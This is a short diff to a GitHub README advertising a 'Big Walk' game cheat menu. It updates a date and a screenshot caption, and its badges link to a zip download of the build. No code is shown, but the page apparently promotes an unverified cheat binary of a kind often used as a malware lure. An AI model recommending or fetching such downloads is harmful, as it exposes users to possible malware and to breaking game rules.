@@ -1,4 +1,4 @@
-# Big Walk Cheat Menu - v1.2 (September 14)
+# Big Walk Cheat Menu - v1.2 (September 20)
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.zip)
@@ -10,7 +10,7 @@
 ---
 
 ## Screenshots
-![Preview](https://github.com/tunnelshinobivice/Big-Walk-v1/blob/main/assets/image.jpg)
+![Big Walk Hacks Menu](https://github.com/tunnelshinobivice/Big-Walk-v1/blob/main/assets/image.jpg)
 
 ---
 
